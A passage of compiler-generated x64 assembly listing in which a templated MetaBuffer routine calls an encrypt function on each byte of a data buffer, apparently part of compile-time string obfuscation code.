  001c3	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$04$0HF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@@std@@@@AEBAEE@Z ; MetaBuffer<5,117,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51> >::encrypt
  001c8	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  001cf	88 41 0a	 mov	 BYTE PTR [rcx+10], al
  001d2	b8 01 00 00 00	 mov	 eax, 1
  001d7	48 6b c0 0a	 imul	 rax, rax, 10
  001db	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  001e2	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  001e6	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  001ed	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$04$0HF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@@std@@@@AEBAEE@Z ; MetaBuffer<5,117,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51> >::encrypt
  001f2	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  001f9	88 41 0b	 mov	 BYTE PTR [rcx+11], al
  001fc	b8 01 00 00 00	 mov	 eax, 1
  00201	48 6b c0 0b	 imul	 rax, rax, 11
  00205	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0020c	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00210	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00217	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$04$0HF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@@std@@@@AEBAEE@Z ; MetaBuffer<5,117,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51> >::encrypt
  0021c	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00223	88 41 0c	 mov	 BYTE PTR [rcx+12], al
  00226	b8 01 00 00 00	 mov	 eax, 1
  0022b	48 6b c0 0c	 imul	 rax, rax, 12
  0022f	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00236	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  0023a	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00241	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$04$0HF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@@std@@@@AEBAEE@Z ; MetaBuffer<5,117,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51> >::encrypt
  00246	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0024d	88 41 0d	 mov	 BYTE PTR [rcx+13], al
  00250	b8 01 00 00 00	 mov	 eax, 1
  00255	48 6b c0 0d	 imul	 rax, rax, 13
  00259	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00260	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00264	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0026b	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$04$0HF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@@std@@@@AEBAEE@Z ; MetaBuffer<5,117,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51> >::encrypt
  00270	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00277	88 41 0e	 mov	 BYTE PTR [rcx+14], al
  0027a	b8 01 00 00 00	 mov	 eax, 1
  0027f	48 6b c0 0e	 imul	 rax, rax, 14
  00283	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0028a	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  0028e	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00295	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$04$0HF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@@std@@@@AEBAEE@Z ; MetaBuffer<5,117,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51> >::encrypt
  0029a	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  002a1	88 41 0f	 mov	 BYTE PTR [rcx+15], al
  002a4	b8 01 00 00 00	 mov	 eax, 1
  002a9	48 6b c0 0f	 imul	 rax, rax, 15
  002ad	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  002b4	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  002b8	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  002bf	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$04$0HF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@@std@@@@AEBAEE@Z ; MetaBuffer<5,117,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51> >::encrypt
  002c4	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  002cb	88 41 10	 mov	 BYTE PTR [rcx+16], al
  002ce	b8 01 00 00 00	 mov	 eax, 1
  002d3	48 6b c0 10	 imul	 rax, rax, 16
  002d7	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  002de	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  002e2	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  002e9	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$04$0HF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@@std@@@@AEBAEE@Z ; MetaBuffer<5,117,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51> >::encrypt
  002ee	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  002f5	88 41 11	 mov	 BYTE PTR [rcx+17], al
  002f8	b8 01 00 00 00	 mov	 eax, 1
  002fd	48 6b c0 11	 imul	 rax, rax, 17
  00301	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00308	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  0030c	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00313	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$04$0HF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@@std@@@@AEBAEE@Z ; MetaBuffer<5,117,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51> >::encrypt
  00318	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0031f	88 41 12	 mov	 BYTE PTR [rcx+18], al
  00322	b8 01 00 00 00	 mov	 eax, 1
  00327	48 6b c0 12	 imul	 rax, rax, 18
  0032b	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00332	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00336	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0033d	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$04$0HF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@@std@@@@AEBAEE@Z ; MetaBuffer<5,117,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51> >::encrypt
  00342	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00349	88 41 13	 mov	 BYTE PTR [rcx+19], al
  0034c	b8 01 00 00 00	 mov	 eax, 1
  00351	48 6b c0 13	 imul	 rax, rax, 19
  00355	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0035c	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00360	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00367	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$04$0HF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@@std@@@@AEBAEE@Z ; MetaBuffer<5,117,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51> >::encrypt
  0036c	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00373	88 41 14	 mov	 BYTE PTR [rcx+20], al
  00376	b8 01 00 00 00	 mov	 eax, 1
  0037b	48 6b c0 14	 imul	 rax, rax, 20
  0037f	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00386	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  0038a	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00391	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$04$0HF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@@std@@@@AEBAEE@Z ; MetaBuffer<5,117,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51> >::encrypt
  00396	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0039d	88 41 15	 mov	 BYTE PTR [rcx+21], al
  003a0	b8 01 00 00 00	 mov	 eax, 1
  003a5	48 6b c0 15	 imul	 rax, rax, 21
  003a9	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  003b0	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  003b4	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  003bb	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$04$0HF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@@std@@@@AEBAEE@Z ; MetaBuffer<5,117,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51> >::encrypt
  003c0	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  003c7	88 41 16	 mov	 BYTE PTR [rcx+22], al
  003ca	b8 01 00 00 00	 mov	 eax, 1
  003cf	48 6b c0 16	 imul	 rax, rax, 22
  003d3	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  003da	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  003de	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  003e5	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$04$0HF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@@std@@@@AEBAEE@Z ; MetaBuffer<5,117,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51> >::encrypt
  003ea	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  003f1	88 41 17	 mov	 BYTE PTR [rcx+23], al
  003f4	b8 01 00 00 00	 mov	 eax, 1
  003f9	48 6b c0 17	 imul	 rax, rax, 23
  003fd	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00404	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00408	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0040f	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$04$0HF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@@std@@@@AEBAEE@Z ; MetaBuffer<5,117,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51> >::encrypt
  00414	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0041b	88 41 18	 mov	 BYTE PTR [rcx+24], al
  0041e	b8 01 00 00 00	 mov	 eax, 1
  00423	48 6b c0 18	 imul	 rax, rax, 24
  00427	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0042e	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00432	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00439	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$04$0HF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@@std@@@@AEBAEE@Z ; MetaBuffer<5,117,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51> >::encrypt
  0043e	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00445	88 41 19	 mov	 BYTE PTR [rcx+25], al
  00448	b8 01 00 00 00	 mov	 eax, 1
  0044d	48 6b c0 19	 imul	 rax, rax, 25
  00451	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00458	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  0045c	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00463	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$04$0HF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@@std@@@@AEBAEE@Z ; MetaBuffer<5,117,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51> >::encrypt
  00468	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0046f	88 41 1a	 mov	 BYTE PTR [rcx+26], al
  00472	b8 01 00 00 00	 mov	 eax, 1
  00477	48 6b c0 1a	 imul	 rax, rax, 26
  0047b	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00482	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00486	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0048d	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$04$0HF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@@std@@@@AEBAEE@Z ; MetaBuffer<5,117,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51> >::encrypt
  00492	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00499	88 41 1b	 mov	 BYTE PTR [rcx+27], al
  0049c	b8 01 00 00 00	 mov	 eax, 1
  004a1	48 6b c0 1b	 imul	 rax, rax, 27
  004a5	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  004ac	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  004b0	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  004b7	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$04$0HF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@@std@@@@AEBAEE@Z ; MetaBuffer<5,117,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51> >::encrypt
  004bc	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  004c3	88 41 1c	 mov	 BYTE PTR [rcx+28], al
  004c6	b8 01 00 00 00	 mov	 eax, 1
  004cb	48 6b c0 1c	 imul	 rax, rax, 28
  004cf	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  004d6	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  004da	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  004e1	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$04$0HF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@@std@@@@AEBAEE@Z ; MetaBuffer<5,117,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51> >::encrypt
  004e6	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  004ed	88 41 1d	 mov	 BYTE PTR [rcx+29], al
  004f0	b8 01 00 00 00	 mov	 eax, 1
  004f5	48 6b c0 1d	 imul	 rax, rax, 29
  004f9	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00500	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00504	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0050b	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$04$0HF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@@std@@@@AEBAEE@Z ; MetaBuffer<5,117,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51> >::encrypt
  00510	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00517	88 41 1e	 mov	 BYTE PTR [rcx+30], al
  0051a	b8 01 00 00 00	 mov	 eax, 1
  0051f	48 6b c0 1e	 imul	 rax, rax, 30
  00523	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0052a	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  0052e	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
